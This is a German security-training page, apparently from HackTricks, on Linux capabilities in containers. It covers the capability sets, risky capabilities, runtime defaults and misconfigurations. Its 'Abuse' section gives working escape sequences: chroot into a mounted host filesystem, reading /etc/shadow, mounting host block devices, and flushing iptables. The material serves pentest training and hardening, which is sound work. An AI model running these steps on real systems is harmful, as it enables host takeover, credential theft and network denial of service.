# Linux Capabilities in Containern

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

Linux capabilities gehören zu den wichtigsten Bestandteilen der Container-Sicherheit, da sie eine subtile, aber grundlegende Frage beantworten: **Was bedeutet „root“ innerhalb eines Containers wirklich?** Auf einem normalen Linux-System bedeutete UID 0 historisch einen sehr weitreichenden Berechtigungssatz. In modernen Kernels wird diese Berechtigung in kleinere Einheiten zerlegt, die als Capabilities bezeichnet werden. Ein Prozess kann als root ausgeführt werden und dennoch viele mächtige Operationen nicht ausführen, wenn die entsprechenden Capabilities entfernt wurden.

Container machen sich diese Unterscheidung intensiv zunutze. Viele Workloads werden aus Gründen der Kompatibilität oder Einfachheit weiterhin als UID 0 innerhalb des Containers gestartet. Ohne das Entfernen von Capabilities wäre das viel zu gefährlich. Mit dem Entfernen von Capabilities kann ein containerisierter root-Prozess weiterhin viele gewöhnliche Aufgaben innerhalb des Containers ausführen, während ihm sensiblere Kernel-Operationen verweigert werden. Deshalb bedeutet eine Container-Shell, die `uid=0(root)` anzeigt, nicht automatisch „host root“ oder auch nur umfassende Kernel-Berechtigungen. Die Capability-Sets bestimmen, wie viel diese root-Identität tatsächlich wert ist.

Eine vollständige Referenz zu Linux Capabilities und zahlreiche Beispiele für deren Missbrauch findest du unter:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funktionsweise

Capabilities werden in mehreren Sets verwaltet, darunter permitted, effective, inheritable, ambient und bounding sets. Für viele Container-Assessments ist die exakte Kernel-Semantik jedes einzelnen Sets weniger unmittelbar wichtig als die praktische Kernfrage: **Welche privilegierten Operationen kann dieser Prozess jetzt erfolgreich ausführen, und welche zukünftigen Privilege Gains sind noch möglich?**

Das ist wichtig, weil viele Breakout-Techniken im Grunde Capability-Probleme sind, die als Container-Probleme getarnt werden. Ein Workload mit `CAP_SYS_ADMIN` kann auf eine enorme Menge an Kernel-Funktionen zugreifen, die ein normaler Container-root-Prozess nicht verwenden sollte. Ein Workload mit `CAP_NET_ADMIN` wird deutlich gefährlicher, wenn er außerdem den Host-Network-Namespace teilt. Ein Workload mit `CAP_SYS_PTRACE` wird besonders interessant, wenn er über das Teilen des Host-PID-Namespace Host-Prozesse sehen kann. In Docker oder Podman kann dies als `--pid=host` erscheinen; in Kubernetes tritt es normalerweise als `hostPID: true` auf.

Mit anderen Worten: Das Capability-Set kann nicht isoliert bewertet werden. Es muss zusammen mit Namespaces, seccomp und der MAC policy betrachtet werden.

## Labor

Eine sehr direkte Möglichkeit, Capabilities innerhalb eines Containers zu untersuchen, ist:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Sie können außerdem einen restriktiveren Container mit einem vergleichen, dem alle Capabilities hinzugefügt wurden:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Um die Auswirkung einer eng begrenzten Ergänzung zu sehen, versuchen Sie, alles zu entfernen und nur eine Capability wieder hinzuzufügen:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Diese kleinen Experimente helfen zu zeigen, dass eine Runtime nicht einfach einen Boolean namens „privileged“ umschaltet. Sie formt die tatsächlich für den Prozess verfügbare Privilege-Oberfläche.

## High-Risk Capabilities

Obwohl je nach Ziel viele Capabilities relevant sein können, sind einige bei der Analyse von Container Escape immer wieder von Bedeutung.

**`CAP_SYS_ADMIN`** ist die Capability, die Defender mit dem größten Misstrauen behandeln sollten. Sie wird oft als „the new root“ bezeichnet, weil sie eine enorme Menge an Funktionalität freischaltet, darunter mount-bezogene Operationen, Namespace-sensitives Verhalten und viele Kernel-Pfade, die niemals unbedacht für Container verfügbar gemacht werden sollten. Wenn ein Container über `CAP_SYS_ADMIN`, schwaches seccomp und keine starke MAC-Konfinierung verfügt, werden viele klassische Breakout-Pfade deutlich realistischer.

**`CAP_SYS_PTRACE`** ist relevant, wenn Prozesssichtbarkeit vorhanden ist, insbesondere wenn der PID-Namespace mit dem Host oder mit interessanten benachbarten Workloads geteilt wird. Dadurch kann Sichtbarkeit in Manipulation übergehen.

**`CAP_NET_ADMIN`** und **`CAP_NET_RAW`** sind in netzwerkorientierten Umgebungen relevant. In einem isolierten Bridge-Netzwerk können sie bereits riskant sein; in einem gemeinsam genutzten Host-Netzwerk-Namespace sind sie deutlich gefährlicher, weil der Workload möglicherweise das Host-Networking neu konfigurieren, Traffic sniffen oder spoofen oder lokale Traffic-Flows stören kann.

**`CAP_SYS_MODULE`** ist in einer rootful-Umgebung normalerweise katastrophal, weil das Laden von Kernel-Modulen praktisch die Kontrolle über den Host-Kernel bedeutet. Diese Capability sollte in einem Container-Workload für allgemeine Zwecke fast nie vorhanden sein.

## Runtime Usage

Docker, Podman, containerd-basierte Stacks und CRI-O verwenden allesamt Capability-Kontrollen, aber die Defaults und Management-Interfaces unterscheiden sich. Docker stellt sie über Flags wie `--cap-drop` und `--cap-add` sehr direkt zur Verfügung. Podman bietet ähnliche Kontrollen und profitiert häufig zusätzlich von der Ausführung als rootless. Kubernetes stellt Capability-Erweiterungen und -Entfernungen über den `securityContext` des Pods oder Containers bereit. System-Container-Umgebungen wie LXC/Incus verwenden ebenfalls Capability-Kontrollen, aber die umfassendere Host-Integration dieser Systeme verleitet Betreiber häufig dazu, Defaults aggressiver zu lockern, als sie es in einer App-Container-Umgebung tun würden.

Dasselbe Prinzip gilt für alle: Eine Capability, deren Vergabe technisch möglich ist, sollte nicht zwangsläufig auch vergeben werden. Viele Vorfälle in der Praxis beginnen damit, dass ein Betreiber eine Capability hinzufügt, nur weil ein Workload unter einer strengeren Konfiguration fehlgeschlagen ist und das Team eine schnelle Lösung benötigte.

## Misconfigurations

Der offensichtlichste Fehler ist **`--cap-add=ALL`** in Docker-/Podman-ähnlichen CLIs, aber nicht der einzige. In der Praxis besteht ein häufigeres Problem darin, eine oder zwei extrem mächtige Capabilities zu vergeben, insbesondere `CAP_SYS_ADMIN`, um „die Anwendung zum Laufen zu bringen“, ohne zugleich die Auswirkungen auf Namespace, seccomp und Mounts zu verstehen. Ein weiterer häufiger Fehler ist die Kombination zusätzlicher Capabilities mit dem Teilen von Host-Namespaces. In Docker oder Podman kann dies als `--pid=host`, `--network=host` oder `--userns=host` auftreten; in Kubernetes zeigt sich die entsprechende Exposition normalerweise durch Workload-Einstellungen wie `hostPID: true` oder `hostNetwork: true`. Jede dieser Kombinationen verändert, worauf sich die Capability tatsächlich auswirken kann.

Ebenso häufig glauben Administratoren, dass ein Workload weiterhin maßgeblich eingeschränkt ist, weil er nicht vollständig `--privileged` ist. Manchmal stimmt das, manchmal ist die effektive Sicherheitslage jedoch bereits so nah an privileged, dass die Unterscheidung im Betrieb keine Rolle mehr spielt.

## Abuse

Der erste praktische Schritt besteht darin, das effektive Capability-Set zu enumerieren und sofort die Capability-spezifischen Aktionen zu testen, die für Escape oder den Zugriff auf Host-Informationen relevant wären:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, teste zuerst Mount-basierten Missbrauch und den Zugriff auf das Host-Dateisystem, da dies einer der häufigsten Enabler für Container-Escapes ist:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Wenn `CAP_SYS_PTRACE` vorhanden ist und der Container interessante Prozesse sehen kann, prüfe, ob sich die Capability zur Prozessinspektion nutzen lässt:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden ist, prüfen Sie, ob der Workload den sichtbaren Netzwerk-Stack manipulieren oder zumindest nützliche Netzwerk-Informationen sammeln kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wenn ein Capability-Test erfolgreich ist, kombiniere ihn mit der Namespace-Situation. Eine Capability, die in einem isolierten Namespace lediglich riskant wirkt, kann sofort zu einem Escape oder einer Host-Recon-Primitive werden, wenn der Container zusätzlich die Host-PID, das Host-Netzwerk oder Host-Mounts gemeinsam nutzt.

### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Host-Mount = Host-Escape

Wenn der Container über `CAP_SYS_ADMIN` und einen beschreibbaren Bind-Mount des Host-Dateisystems wie `/host` verfügt, ist der Escape-Pfad oft unkompliziert:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Wenn `chroot` erfolgreich ist, werden Befehle nun im Kontext des Root-Dateisystems des Hosts ausgeführt:
```bash
id
hostname
cat /etc/shadow | head
```
Wenn `chroot` nicht verfügbar ist, lässt sich dasselbe Ergebnis oft erreichen, indem die Binärdatei über den eingehängten Baum aufgerufen wird:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Gerätezugriff

Wenn ein Blockgerät vom Host verfügbar gemacht wird, kann `CAP_SYS_ADMIN` es in direkten Zugriff auf das Host-Dateisystem umwandeln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Vollständiges Beispiel: `CAP_NET_ADMIN` + Host Networking

Diese Kombination führt nicht immer direkt zu Root-Rechten auf dem Host, kann den Netzwerk-Stack des Hosts jedoch vollständig neu konfigurieren:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das kann denial of service, traffic interception oder den Zugriff auf zuvor gefilterte Services ermöglichen.

## Checks

Das Ziel der capability checks besteht nicht nur darin, rohe Werte zu dumpen, sondern auch zu verstehen, ob der Prozess über ausreichende Privilegien verfügt, um seine aktuelle namespace- und mount-Situation gefährlich zu machen.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Was ist hier interessant:

- `capsh --print` ist der einfachste Weg, um riskante capabilities wie `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` oder `cap_sys_module` zu erkennen.
- Die Zeile `CapEff` in `/proc/self/status` zeigt, welche capabilities tatsächlich aktiv sind, nicht nur, welche in anderen Sets verfügbar sein könnten.
- Ein capability dump wird deutlich wichtiger, wenn der Container außerdem die Host-PID-, Netzwerk- oder user namespaces teilt oder über beschreibbare Host mounts verfügt.

Nach dem Erfassen der rohen capability-Informationen ist der nächste Schritt die Interpretation. Prüfe, ob der Prozess root ist, ob user namespaces aktiv sind, ob Host namespaces geteilt werden, ob seccomp erzwingend aktiv ist und ob AppArmor oder SELinux den Prozess weiterhin einschränken. Ein capability set ist für sich genommen nur ein Teil des Gesamtbilds, aber oft genau der Teil, der erklärt, warum ein Container breakout funktioniert und ein anderer mit demselben scheinbaren Ausgangspunkt mit demselben Ausgangspunkt scheitert.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig reduziertes capability set | Docker verwendet standardmäßig eine Allowlist von capabilities und entfernt den Rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Standardmäßig reduziertes capability set | Podman containers sind standardmäßig unprivileged und verwenden ein reduziertes capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Übernimmt die Runtime Defaults, sofern nicht geändert | Wenn keine `securityContext.capabilities` angegeben sind, erhält der container das Default capability set der Runtime | `securityContext.capabilities.add`, `drop: [\"ALL\"]` nicht zu setzen, `privileged: true` |
| containerd / CRI-O under Kubernetes | Üblicherweise Runtime Default | Das effektive set hängt von der Runtime und dem Pod spec ab | wie in der Kubernetes-Zeile; auch die direkte OCI/CRI-Konfiguration kann capabilities explizit hinzufügen |

Für Kubernetes ist entscheidend, dass die API kein einheitliches universelles Default capability set definiert. Wenn der Pod capabilities weder hinzufügt noch entfernt, übernimmt die Workload das Runtime Default für diesen Node.
{{#include ../../../../banners/hacktricks-training.md}}
